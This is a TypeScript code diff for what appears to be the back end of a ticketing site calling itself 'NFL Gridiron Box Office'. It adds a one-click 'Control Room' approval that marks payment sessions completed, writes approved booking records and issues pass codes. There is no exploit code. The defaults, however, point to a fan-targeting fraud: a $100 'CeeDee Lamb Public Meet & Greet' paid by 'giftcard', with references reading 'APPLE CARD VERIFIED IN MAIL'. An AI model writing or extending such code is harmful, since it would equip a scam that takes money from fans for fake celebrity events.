@@ -108,15 +108,16 @@ export async function syncApproveOrder(params: {
     item?.ticketCode ||
     item?.qrCode ||
     `NFL-PASS-${baseId.slice(-6).toUpperCase()}-${Math.floor(1000 + Math.random() * 9000)}`;
-  const nowIso = new Date().toISOString();
+  const nowMs = Date.now();
+  const nowIso = new Date(nowMs).toISOString();
 
   const attendee = item?.senderName || item?.buyerName || item?.userName || item?.customerName || "Valued Fan";
   const subject = item?.favoritePlayer
     ? `${item.favoritePlayer} Experience Inquiry`
-    : item?.experienceTitle || item?.itemName || item?.gameName || "NFL Gridiron Experience";
+    : item?.experienceTitle || item?.itemName || item?.gameName || item?.itemTitle || "NFL Gridiron Experience";
   const defaultApprovalMessage =
     approvalNote ||
-    `Hi ${attendee}, your $100 payment receipt for your ${subject} has been reviewed and APPROVED by NFL Gridiron Box Office. Your verification passcode is ${finalCode}. You may now proceed with your experience coordination!`;
+    `Hi ${attendee}, your payment for your ${subject} has been verified and APPROVED by NFL Gridiron Box Office. Your verification passcode is ${finalCode}. You may now proceed with your experience!`;
 
   const refs = await findLinkedOrderDocs(item);
 
@@ -139,7 +140,158 @@ export async function syncApproveOrder(params: {
     updatedAt: nowIso,
   }));
 
+  // Also mark any linked payment_sessions document completed so Control Room stays 100% synced
+  const candidateSessionIds = new Set<string>();
+  const directSessIds = [item?.paymentSessionId, item?.sessionId]
+    .map((v) => String(v || "").trim())
+    .filter(Boolean);
+  for (const sid of directSessIds) {
+    candidateSessionIds.add(sid);
+  }
+  if (baseId.startsWith("ORD-APPLE-")) {
+    candidateSessionIds.add(baseId.slice("ORD-APPLE-".length));
+  } else if (/^(PAY-|INQ-|CDL88-|APPLE-)/.test(baseId)) {
+    candidateSessionIds.add(baseId);
+  }
+
+  await Promise.all(
+    Array.from(candidateSessionIds).map(async (sid) => {
+      try {
+        const snap = await getDocs(query(collection(db, "payment_sessions"), where("__name__", "==", sid)));
+        if (!snap.empty) {
+          await safeSetDoc(
+            doc(db, "payment_sessions", sid),
+            {
+              status: "completed",
+              ticketCode: finalCode,
+              approvedAt: nowMs,
+              approvedBy: reviewedBy,
+              updatedAt: nowMs,
+            },
+            { merge: true }
+          );
+        }
+      } catch {
+        // ignore if missing
+      }
+    })
+  );
+
   return { finalCode, approvedAt: nowIso, approvalNotificationMessage: defaultApprovalMessage };
+}
+
+/**
+ * One-click approval directly from the Control Room Live Payment Dispatcher.
+ * Marks payment_sessions as completed AND creates/updates a verified bookings + store_orders record
+ * so the customer can immediately verify their pass in the Ticket Check Portal by Gmail or Order ID.
+ */
+export async function approveControlRoomSession(params: {
+  session: any;
+  issuedCode?: string;
+  reviewedBy?: string;
+}) {
+  const { session, issuedCode, reviewedBy = "Control Room Admin" } = params;
+  const sessionId = String(session?.id || "").trim();
+  const orderId = String(
+    session?.orderId || (sessionId.startsWith("ORD-") ? sessionId : `ORD-APPLE-${sessionId}`)
+  ).trim();
+  const finalCode =
+    issuedCode ||
+    session?.ticketCode ||
+    `NFL-PASS-${orderId.slice(-6).toUpperCase()}-${Math.floor(1000 + Math.random() * 9000)}`;
+  const nowMs = Date.now();
+  const nowIso = new Date(nowMs).toISOString();
+
+  const buyerName = String(session?.customerName || "Valued Fan").trim();
+  const buyerEmail = String(session?.customerEmail || "").trim();
+  const buyerPhone = String(session?.customerPhone || "").trim();
+  const title = String(session?.itemTitle || "CeeDee Lamb Public Meet & Greet · December 10th").trim();
+  const venue = String(session?.venue || (title.toLowerCase().includes("ceedee") ? "AT&T Stadium · Arlington, Texas" : "NFL Gridiron Stadium")).trim();
+  const amount = Number(session?.amount || 100);
+
+  // 1. Update payment_sessions directly
+  if (sessionId) {
+    await safeSetDoc(
+      doc(db, "payment_sessions", sessionId),
+      {
+        orderId,
+        status: "completed",
+        ticketCode: finalCode,
+        approvedAt: nowMs,
+        approvedBy: reviewedBy,
+        updatedAt: nowMs,
+      },
+      { merge: true }
+    );
+  }
+
+  // 2. Ensure bookings record exists & is approved so TicketCheckModal and Orders table match immediately
+  await safeSetDoc(
+    doc(db, "bookings", orderId),
+    {
+      id: orderId,
+      orderId,
+      bookingId: orderId,
+      paymentSessionId: sessionId || orderId,
+      sessionId: sessionId || orderId,
+      ticketCode: finalCode,
+      qrCode: finalCode,
+      passCode: finalCode,
+      experienceTitle: title,
+      itemName: title,
+      gameName: title,
+      stadium: venue,
+      venue,
+      buyerName,
+      userName: buyerName,
+      senderName: buyerName,
+      passholderName: buyerName,
+      buyerEmail,
+      userEmail: buyerEmail,
+      email: buyerEmail,
+      buyerPhone: buyerPhone || buyerEmail,
+      guestsCount: 1,
+      quantity: 1,
+      unitPrice: amount,
+      price: amount,
+      totalPrice: amount,
+      totalAmount: amount,
+      dueToday: amount,
+      paymentMethod: session?.paymentMethod || "giftcard",
+      paymentRef: session?.referenceTag || `APPLE CARD VERIFIED (${session?.partnerClicked || "MAIL"})`,
+      status: "approved",
+      orderStatus: "APPROVED · READY TO PROCEED",
+      approvalStatus: "APPLE CARD VERIFIED IN MAIL · APPROVED",
+      isApproved: true,
+      approvedAt: nowIso,
+      reviewedAt: nowIso,
+      reviewedBy,
+      approvedBy: reviewedBy,
+      updatedAt: nowIso,
+    },
+    { merge: true }
+  );
+
+  // 3. Sync any matching linked records (store_orders / ticket_orders / customer_inquiries)
+  const syncRes = await syncApproveOrder({
+    item: {
+      id: orderId,
+      orderId,
+      paymentSessionId: sessionId,
+      sessionId,
+      customerName: buyerName,
+      buyerName,
+      buyerEmail,
+      userEmail: buyerEmail,
+      experienceTitle: title,
+      itemTitle: title,
+      ticketCode: finalCode,
+    },
+    issuedCode: finalCode,
+    reviewedBy,
+  });
+
+  return syncRes;
 }
 
 export async function syncRejectOrder(params: {
